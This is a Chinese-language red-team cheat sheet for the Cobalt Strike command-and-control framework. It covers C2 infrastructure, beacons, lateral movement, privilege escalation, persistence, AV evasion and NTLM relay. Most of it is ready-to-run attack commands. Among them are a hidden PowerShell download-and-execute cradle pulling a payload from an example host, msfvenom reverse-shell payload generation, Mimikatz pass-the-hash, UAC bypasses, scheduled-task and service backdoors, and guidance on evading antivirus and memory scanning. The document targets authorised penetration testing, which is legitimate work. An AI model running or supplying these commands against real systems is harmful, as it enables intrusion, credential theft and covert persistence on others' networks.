# Cobalt Strike

> Cobalt Strike是一款威胁模拟软件。红队和渗透测试人员使用Cobalt Strike来演示违规风险并评估成熟的安全计划。Cobalt Strike利用网络漏洞，发起鱼叉式钓鱼活动，托管网页驱动攻击，并通过强大的图形用户界面生成恶意软件感染文件，鼓励协作并报告所有活动。

```powershell
$ sudo apt-get update
$ sudo apt-get install openjdk-11-jdk
$ sudo apt install proxychains socat
$ sudo update-java-alternatives -s java-1.11.0-openjdk-amd64
$ sudo ./teamserver 10.10.10.10 "password" [可变形C2配置文件]
$ ./cobaltstrike
$ powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://campaigns.example.com/download/dnsback'))" 
```

## 摘要

* [基础设施](#基础设施)
  * [重定向器](#重定向器)
  * [域名前置](#域名前置)
* [操作安全](#操作安全)
  * [客户ID](#客户ID)
* [有效载荷](#有效载荷)
  * [DNS信标](#DNS信标)
  * [SMB信标](#SMB信标)
  * [Metasploit兼容性](#Metasploit兼容性)
  * [自定义有效载荷](#自定义有效载荷)
* [可变形C2](#可变形C2)
* [文件](#文件)
* [PowerShell和.NET](#PowerShell和.NET)
  * [PowerShell命令](#PowerShell命令)
  * [.NET远程执行](#.NET远程执行)
* [横向移动](#横向移动)
* [VPN和跳转](#VPN和跳转)
* [工具包](#工具包)
  * [提升工具包](#提升工具包)
  * [持久性工具包](#持久性工具包)
  * [资源工具包](#资源工具包)
  * [工件工具包](#工件工具包)
  * [Mimikatz工具包](#Mimikatz工具包)
  * [睡眠面具工具包](#睡眠面具工具包)
  * [线程栈欺骗器](#线程栈欺骗器)
* [信标对象文件](#信标对象文件)
* [通过Cobalt Strike进行NTLM中继](#通过Cobalt Strike进行NTLM中继)
* [参考资料](#参考资料)

## 基础设施

### 重定向器

```powershell
sudo apt install socat
socat TCP4-LISTEN:80,fork TCP4:[团队服务器]:80
```

### 域名前置

* 新建监听器 > HTTP主机头
* 在“金融与医疗”领域选择一个域名

## 操作安全

**不要**

* 使用默认的自签名HTTPS证书
* 使用默认端口（50050）
* 使用0.0.0.0 DNS响应
* Metasploit兼容性，请求有效载荷：`wget -U "Internet Explorer" http://127.0.0.1/vl6D`

**要**

* 使用重定向器（Apache，CDN等）
* 防火墙仅接受来自重定向器的HTTP/S
* 通过SSH隧道访问50050端口并在防火墙上阻止访问
* 编辑默认的HTTP 404页面和内容类型：text/plain
* 没有分级设置，将Malleable C2中的`hosts_stage`设置为`false`
* 使用Malleable配置文件针对特定行为者定制攻击

### 客户ID

> 客户ID是与Cobalt Strike许可证密钥关联的一个4字节数字。Cobalt Strike 3.9及更高版本将此信息嵌入到Cobalt Strike生成的有效载荷注入器和注入阶段中。

* 客户ID值是Cobalt Strike 3.9及更高版本中Cobalt Strike有效载荷注入器的最后4个字节。
* 试用版的客户ID值为0。
* Cobalt Strike在其网络流量或工具的其他部分不使用客户ID值

## 有效载荷

### DNS信标

* 编辑域的区文件
* 为Cobalt Strike系统创建一个A记录
* 创建一个指向您的Cobalt Strike系统FQDN的NS记录

您的Cobalt Strike团队服务器系统必须是您指定的域的权威。创建一个DNS A记录并将其指向您的Cobalt Strike团队服务器。使用DNS NS记录将几个域或子域委托给您的Cobalt Strike团队服务器的A记录。

* nslookup jibberish.beacon polling.campaigns.domain.com
* nslookup jibberish.beacon campaigns.domain.com

Digital Ocean上的DNS示例：

```powershell
NS  example.com                     指向 10.10.10.10.            86400
NS  polling.campaigns.example.com   指向 campaigns.example.com.	3600
A	campaigns.example.com           指向 10.10.10.10	            3600 
```

```powershell
systemctl disable systemd-resolved
systemctl stop systemd-resolved
rm /etc/resolv.conf
echo "nameserver 8.8.8.8" >  /etc/resolv.conf
echo "nameserver 8.8.4.4" >>  /etc/resolv.conf
```

配置：

1. **主机**：campaigns.domain.com
2. **信标**：polling.campaigns.domain.com
3. 与信标交互，并设置`sleep 0`

### SMB信标   

```powershell
link [主机] [管道名称]
connect [主机] [端口]
unlink [主机] [PID]
jump [执行] [主机] [管道]
```

SMB信标使用命名管道。在运行它时可能会遇到以下错误代码。

| 错误代码 | 含义          | 描述                                               |
| -------- | ------------- | -------------------------------------------------- |
| 2        | 文件未找到    | 没有信标供您链接                                   |
| 5        | 访问被拒绝    | 无效凭据或没有权限                                 |
| 53       | 错误的Netpath | 与目标系统没有信任关系。那里可能有也可能没有信标。 |

### SSH信标

```powershell
# 部署信标
beacon> help ssh
用法：ssh [目标:端口] [用户名] [密码]
生成SSH客户端并尝试登录到指定的目标

beacon> help ssh-key
用法：ssh [目标:端口] [用户名] [/path/to/key.pem]
生成SSH客户端并尝试使用指定的私钥文件登录到目标

# 信标的命令
上传                    上传文件
下载                  下载文件
socks                     启动SOCKS4a服务器以转发流量
sudo                      通过sudo运行命令
rportfwd                  设置反向端口转发
shell                     通过shell执行命令
```

### Metasploit兼容性

* 有效载荷：windows/meterpreter/reverse_http 或 windows/meterpreter/reverse_https
* 将LHOST和LPORT设置为信标
* 将DisablePayloadHandler设置为True
* 将PrependMigrate设置为True
* exploit -j

### 自定义有效载荷

https://ired.team/offensive-security/code-execution/using-msbuild-to-execute-shellcode-in-c

```powershell
* 攻击 > 包 > 有效载荷生成器 
* 攻击 > 包 > 脚本化Web交付(S)
$ python2 ./shellcode_encoder.py -cpp -cs -py payload.bin MySecretPassword xor
$ C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe C:\Windows\Temp\dns_raw_stageless_x64.xml
$ %windir%\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe \\10.10.10.10\Shared\dns_raw_stageless_x86.xml
```

## 可塑C2

托管在Github上的可塑C2配置文件列表

* Cobalt Strike - 可塑C2配置文件 https://github.com/xx0hcd/Malleable-C2-Profiles
* Cobalt Strike 可塑C2设计与参考指南 https://github.com/threatexpress/malleable-c2
* Malleable-C2-Profiles https://github.com/rsmudge/Malleable-C2-Profiles
* SourcePoint 是一个C2配置文件生成器 https://github.com/Tylous/SourcePoint

语法示例

```powershell
set useragent "SOME AGENT"; # 正确
set useragent 'SOME AGENT'; # 错误
prepend "This is an example;";

# 转义双引号
append "here is \"some\" stuff";
# 转义反斜杠
append "more \\ stuff";
# 一些特殊字符不需要转义
prepend "!@#$%^&*()";
```

使用`./c2lint`检查配置文件。

* 如果c2lint完成且没有错误，则返回结果0
* 如果c2lint完成且只有警告，则返回结果1
* 如果c2lint完成且只有错误，则返回结果2
* 如果c2lint完成且有错误和警告，则返回结果3

## 文件

```powershell
# 列出指定目录中的文件
beacon > ls <C:\Path>

# 更改到指定的工作目录
beacon > cd [目录]

# 删除文件\文件夹
beacon > rm [文件\文件夹]

# 文件复制
beacon > cp [源] [目的地]

# 从Beacon主机上的路径下载文件
beacon > download [C:\filePath]

# 列出正在进行的下载
beacon > downloads

# 取消正在进行的下载
beacon > cancel [*文件*]

# 从攻击者上传文件到当前Beacon主机
beacon > upload [/path/to/file]
```

## Powershell和.NET

### Powershell命令

```powershell
# 从控制服务器导入Powershell .ps1脚本并保存在Beacon内存中
beacon > powershell-import [/path/to/script.ps1]

# 设置一个绑定到本地主机的TCP服务器，并使用powershell.exe下载上面导入的脚本。然后执行指定的函数及其参数，并返回输出。
beacon > powershell [commandlet][arguments]

# 使用非托管Powershell启动给定函数，该函数不启动powershell.exe。所使用的程序由spawnto设置
beacon > powerpick [commandlet] [argument]

# 将非托管Powershell注入特定进程并执行指定命令。这对于长时间运行的Powershell作业很有用
beacon > psinject [pid][arch] [commandlet] [arguments]
```

### .NET远程执行

将本地.NET可执行文件作为Beacon后渗透作业运行。

要求：

* 使用“Any CPU”配置编译的二进制文件。

```powershell
beacon > execute-assembly [/path/to/script.exe] [arguments]
beacon > execute-assembly /home/audit/Rubeus.exe
[*] 分配任务给信标以运行.NET程序：Rubeus.exe
[+] 主机呼叫回家，发送了：318507字节
[+] 收到输出：

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.4.2 
```

## 横向移动

:warning: OPSEC建议：使用**spawnto**命令更改Beacon将为其后渗透作业启动的进程。默认是rundll32.exe

- **portscan：**对特定目标执行端口扫描。
- **runas：**使用凭据包装runas.exe，可以作为另一个用户运行命令。
- **pth：**通过提供用户名和NTLM哈希，可以执行传递哈希攻击并在当前进程中注入TGT。\
  :exclamation: 此模块需要管理员权限。
- **steal_token：**从指定进程中窃取令牌。
- **make_token：**通过提供凭据，可以在当前进程中创建一个模拟令牌，并从被模拟用户的上下文中执行命令。
- **jump：**提供一种简单快捷的方式，使用winrm或psexec在目标上生成新的信标会话来进行横向移动。\
  :exclamation: **jump**模块将使用当前的委派/模拟令牌在远程目标上进行身份验证。\
  :muscle: 我们可以将**jump**模块与**make_token**或**pth**模块结合使用，以便在网络上快速“跳转”到另一个目标。
- **remote-exec：**使用psexec、winrm或wmi在远程目标上执行命令。\
  :exclamation: **remote-exec**模块将使用当前的委派/模拟令牌在远程目标上进行身份验证。
- **ssh/ssh-key：**使用密码或私钥进行SSH身份验证。适用于Linux和Windows主机。

:warning: 所有命令都启动powershell.exe

```powershell
Beacon Remote Exploits
======================
jump [module] [target] [listener] 

psexec	x86	使用服务运行服务EXE工件
psexec64	x64	使用服务运行服务EXE工件
psexec_psh	x86	使用服务运行PowerShell单行命令
winrm	x86	通过WinRM运行PowerShell脚本
winrm64	x64	通过WinRM运行PowerShell脚本

Beacon Remote Execute Methods
=============================
remote-exec [module] [target] [command] 

方法                             描述
-------                         -----------
psexec                          通过服务控制管理器远程执行
winrm                           通过WinRM（PowerShell）远程执行
wmi                             通过WMI（PowerShell）远程执行

```



---

**操作安全的Pass-the-Hash**：

1. `mimikatz sekurlsa::pth /user:xxx /domain:xxx /ntlm:xxxx /run:"powershell -w hidden"`
2. `steal_token PID`

---

### 控制工件

* 使用 `link` 连接到SMB信标
* 使用 `connect` 连接到TCP信标

---

## VPN和跳转点

:警告: 隐蔽VPN在W10上不工作，并且需要管理员权限才能部署。

> 使用socks 8080在端口8080上设置SOCKS4a代理服务器（或您选择的其他端口）。这将设置一个SOCKS代理服务器，通过信标隧道传输流量。信标的睡眠时间会增加通过它隧道传输的任何流量的延迟。使用sleep 0使信标几秒钟检查一次。

```powershell
# 在给定端口上启动一个SOCKS服务器，通过指定的信标隧道传输流量。在/etc/proxychains.conf中设置teamserver/端口配置，以便于使用。
beacon > socks [端口]
beacon > socks [端口]
beacon > socks [端口] [socks4]
beacon > socks [端口] [socks5]
beacon > socks [端口] [socks5] [enableNoAuth|disableNoAuth] [用户名] [密码]
beacon > socks [端口] [socks5] [enableNoAuth|disableNoAuth] [用户名] [密码] [enableLogging|disableLogging]

# 通过指定的Internet Explorer进程代理浏览器流量。
beacon > browserpivot [pid] [x86|x64]

# 绑定到信标主机上的指定端口，并将任何传入连接转发到转发的主机和端口。
beacon > rportfwd [绑定端口] [转发主机] [转发端口]

# spunnel：生成代理并创建到其控制器的反向端口转发隧道。 ~= rportfwd + shspawn。
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f raw -o /tmp/msf.bin
beacon> spunnel x64 184.105.181.155 4444 C:\Payloads\msf.bin

# spunnel_local：生成代理并创建反向端口转发，通过您的Cobalt Strike客户端隧道传输到其控制器，然后您可以在MSF多处理器上处理回调。
beacon> spunnel_local x64 127.0.0.1 4444 C:\Payloads\msf.bin
```

---

## 工具包

* [Cobalt Strike社区工具包](https://cobalt-strike.github.io/community_kit/) - 社区工具包是由用户社区编写的扩展集合，用于扩展Cobalt Strike的功能

---

### 提升工具包

UAC 令牌复制：在 Windows 10 Red Stone 5（2018年10月）中修复

```powershell
beacon> runasadmin

信标命令提升器
=========================

    利用                         描述
    -------                         -----------
    ms14-058                        跟踪弹出菜单 Win32k 空指针解引用（CVE-2014-4113）
    ms15-051                        Windows ClientCopyImage Win32k 利用（CVE 2015-1701）
    ms16-016                        mrxdav.sys WebDav 本地权限提升（CVE 2016-0051）
    svc-exe                         通过作为服务运行的可执行文件获取 SYSTEM
    uac-schtasks                    使用 schtasks.exe（通过 SilentCleanup）绕过 UAC
    uac-token-duplication           使用令牌复制绕过 UAC
```

### 持久化工具包

* https://github.com/0xthirteen/MoveKit

* https://github.com/fireeye/SharPersist

  ```powershell
  # 列出持久化项
  SharPersist -t schtaskbackdoor -m list
  SharPersist -t startupfolder -m list
  SharPersist -t schtask -m list
  
  # 添加持久化项
  SharPersist -t schtaskbackdoor -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Something Cool" -m add
  SharPersist -t schtaskbackdoor -n "Something Cool" -m remove
  
  SharPersist -t service -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Some Service" -m add
  SharPersist -t service -n "Some Service" -m remove
  
  SharPersist -t schtask -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Some Task" -m add
  SharPersist -t schtask -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Some Task" -m add -o hourly
  SharPersist -t schtask -n "Some Task" -m remove
  ```

### 资源工具包

> 资源工具包是 Cobalt Strike 用来更改其工作流程中使用的 HTA、PowerShell、Python、VBA 和 VBS 脚本模板的手段

### 构件工具包

> Cobalt Strike 使用构件工具包来生成其可执行文件和 DLL。构件工具包是一个源代码框架，用于构建可以规避某些杀毒软件产品的可执行文件和 DLL。构件工具包的构建脚本为每个构件工具包技术创建了一个包含模板构件的文件夹。要在 Cobalt Strike 中使用某项技术，请转到 Cobalt Strike -> 脚本管理器，并加载该技术文件夹中的 artifact.cna 脚本。

构件工具包（Cobalt Strike 4.0）- https://www.youtube.com/watch?v=6mC21kviwG4：

- 下载构件工具包：`转到帮助 -> 军械库以下载构件工具包（需要 Cobalt Strike 的授权版本）`
- 安装依赖项：`sudo apt-get install mingw-w64`
- 编辑构件代码
  * 更改管道名称字符串
  * 更改 `VirtualAlloc` 在 `patch.c`/`patch.exe` 中的，例如：HeapAlloc
  * 更改导入
- 构建构件
- Cobalt Strike -> 脚本管理器 > 加载 .cna

### Mimikatz 工具包

* 从军械库下载并提取 .tgz（注意：版本使用 Mimikatz 发布版本的命名（即，2.2.0.20210724）
* 加载 mimikatz.cna 攻击者脚本
* 正常使用 mimikatz 函数

### 睡眠面具工具包

> 睡眠面具工具包是执行睡眠前在内存中混淆 Beacon 的睡眠面具功能的源代码。

使用随附的 `build.sh` 或 `build.bat` 脚本在 Kali Linux 或 Microsoft Windows 上构建睡眠面具工具包。脚本为三种类型的 Beacon（默认、SMB 和 TCP）在 x86 和 x64 架构上构建睡眠面具对象文件，存放在 sleepmask 目录中。默认类型支持 HTTP、HTTPS 和 DNS Beacon。

### 线程栈欺骗器

> 一种高级的内存中规避技术，欺骗线程调用栈。这种技术允许绕过基于线程的内存检查规则，并在进程内存在时更好地隐藏 shellcode。

线程栈欺骗器现在在构件工具包中默认启用，可以通过配置文件 `arsenal_kit.config` 中的选项 `artifactkit_stack_spoof` 禁用它。

## Beacon对象文件

> Beacon对象文件只是一块位置无关代码，它接收指向某些Beacon内部API的指针

示例：https://github.com/Cobalt-Strike/bof_template/blob/main/beacon.h

* 编译

  ```ps1
  # 使用Visual Studio编译：
  cl.exe /c /GS- hello.c /Fohello.o
  
  # 使用x86 MinGW编译：
  i686-w64-mingw32-gcc -c hello.c -o hello.o
  
  # 使用x64 MinGW编译：
  x86_64-w64-mingw32-gcc -c hello.c -o hello.o
  ```

* 执行：`inline-execute /path/to/hello.o`

## 通过Cobalt Strike进行NTLM中继

```powershell
beacon> socks 1080
kali> proxychains python3 /usr/local/bin/ntlmrelayx.py -t smb://<IP_TARGET>
beacon> rportfwd_local 8445 <IP_KALI> 445
beacon> upload C:\Tools\PortBender\WinDivert64.sys
beacon> PortBender redirect 445 8445
```

## 参考资料

* [Red Team Ops with Cobalt Strike (1 of 9): Operations](https://www.youtube.com/watch?v=q7VQeK533zI)
* [Red Team Ops with Cobalt Strike (2 of 9): Infrastructure](https://www.youtube.com/watch?v=5gwEMocFkc0)
* [Red Team Ops with Cobalt Strike (3 of 9): C2](https://www.youtube.com/watch?v=Z8n9bIPAIao)
* [Red Team Ops with Cobalt Strike (4 of 9): Weaponization](https://www.youtube.com/watch?v=H0_CKdwbMRk)
* [Red Team Ops with Cobalt Strike (5 of 9): Initial Access](https://www.youtube.com/watch?v=bYt85zm4YT8)
* [Red Team Ops with Cobalt Strike (6 of 9): Post Exploitation](https://www.youtube.com/watch?v=Pb6yvcB2aYw)
* [Red Team Ops with Cobalt Strike (7 of 9): Privilege Escalation](https://www.youtube.com/watch?v=lzwwVwmG0io)
* [Red Team Ops with Cobalt Strike (8 of 9): Lateral Movement](https://www.youtube.com/watch?v=QF_6zFLmLn0)
* [Red Team Ops with Cobalt Strike (9 of 9): Pivoting](https://www.youtube.com/watch?v=sP1HgUu7duU&list=PL9HO6M_MU2nfQ4kHSCzAQMqxQxH47d1no&index=10&t=0s)
* [A Deep Dive into Cobalt Strike Malleable C2 - Joe Vest - Sep 5, 2018 ](https://posts.specterops.io/a-deep-dive-into-cobalt-strike-malleable-c2-6660e33b0e0b)
* [Cobalt Strike. Walkthrough for Red Teamers - Neil Lines - 15 Apr 2019](https://www.pentestpartners.com/security-blog/cobalt-strike-walkthrough-for-red-teamers/)
* [TALES OF A RED TEAMER: HOW TO SETUP A C2 INFRASTRUCTURE FOR COBALT STRIKE – UB 2018 - NOV 25 2018](https://holdmybeersecurity.com/2018/11/25/tales-of-a-red-teamer-how-to-setup-a-c2-infrastructure-for-cobalt-strike-ub-2018/)
* [Cobalt Strike - DNS Beacon](https://www.cobaltstrike.com/help-dns-beacon)
* [How to Write Malleable C2 Profiles for Cobalt Strike - January 24, 2017](https://bluescreenofjeff.com/2017-01-24-how-to-write-malleable-c2-profiles-for-cobalt-strike/)
* [NTLM Relaying via Cobalt Strike - July 29, 2021 - Rasta Mouse](https://rastamouse.me/ntlm-relaying-via-cobalt-strike/)
* [Cobalt Strike - User Guide](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/welcome_main.htm)
* [Cobalt Strike 4.6 - User Guide PDF](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/cobalt-4-6-user-guide.pdf)
